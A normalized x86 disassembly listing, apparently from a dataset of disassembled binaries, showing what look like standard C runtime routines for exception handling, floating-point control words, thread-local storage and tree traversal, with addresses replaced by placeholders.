mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_40ffe4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40ee62
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_41002d
push 0x8
push r--data
call sub_413ff0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_414035
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_40ab76
pop ecx
push 0xd
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40ab76
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410147
push 0xc
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410153
push esi
call sub_40ab76
pop ecx
push edi
call sub_40eb5e
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40ab76
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40d811
pop ecx
sub_410160
push ebp
mov ebp esp
sub esp 0xc
cmp [ edi + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
push ebx
lea ebx [ eax + 0xc ]
mov [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ edi + 0x4 ]
push eax
push 0x1
push esi
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ecx eax
jne r-xdata
lea eax [ ecx + 0xc ]
mov edx ebx
call sub_404130
test al al
je r-xdata
lea eax [ ecx + 0xc ]
mov edx ebx
call sub_404130
test al al
je r-xdata
mov edx [ eax + 0x8 ]
add edx 0xc
mov eax ebx
call sub_404130
test al al
je r-xdata
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0xc ]
push eax
push edi
call sub_407860
mov ecx [ eax ]
mov [ esi ] ecx
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push 0x1
push esi
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
add edx 0xc
mov eax ebx
call sub_404130
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
cmp [ ecx + 0x31 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
push ecx
mov ecx [ edx + 0x8 ]
push 0x0
push esi
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
call sub_40a7b0
mov ecx [ eax ]
cmp ecx [ edi + 0x4 ]
je r-xdata
mov eax [ ecx ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov edx [ ebx + 0x8 ]
cmp [ edx + 0x31 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
add eax 0xc
add edx 0xc
call sub_404130
test al al
je r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
push 0x1
push esi
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
push 0x0
push esi
mov ecx ebx
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
lea esp [ esp ]
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
mov ebx [ ebp + 0xc ]
add ebx 0xc
lea edx [ ecx + 0xc ]
mov eax ebx
call sub_404130
test al al
je r-xdata
mov ecx eax
mov ecx eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
push 0x0
push esi
mov eax edi
call sub_406af0
mov eax esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ecx [ eax ]
jne r-xdata
sub_41033d
push 0x10
push r--data
call sub_413ff0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4103d0
mov eax [ ebp - 0x1c ]
call sub_414035
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_401d37
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_40ab76
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_410400
push ebp
mov ebp esp
push 0xffffffff
push sub_41624a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebp + 0x8 ]
xor esi esi
push 0x18
mov [ edi + 0x8 ] esi
call sub_4066cf
add esp 0x4
cmp eax esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] esi
call sub_40140f
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_4037cf
int3
mov [ edi + 0x4 ] eax
mov [ eax ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ edi + 0x4 ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ edi + 0x4 ]
mov [ edx + 0x15 ] al
mov [ ebp - 0x4 ] esi
cmp edi ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x14 ]
mov eax edi
call sub_40ff10
mov eax edi
call sub_40a460
sub_4104c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_401400
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_401400
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_41488b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_414842
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_401400
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_401400
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_414872
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_41488b
mov eax [ ebp + 0xc ]
push r--data
call sub_40ce10
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_401400
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_414859
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_401400
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_41064f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_415e39
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_415ec7
push eax
mov [ ebp - 0xc ] eax
call sub_4036b0
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_410961
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_410985
mov edi edi
push esi
call sub_401c91
mov esi eax
push esi
call sub_40c982
push esi
call sub_4088b9
push esi
call sub_40a821
push esi
call sub_40b626
push esi
call sub_410f7c
push esi
call sub_40d6ab
add esp 0x18
pop esi
retn
sub_4109b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_410f09
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407759
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41596c
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_410f9a
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_40d215
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_411735
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
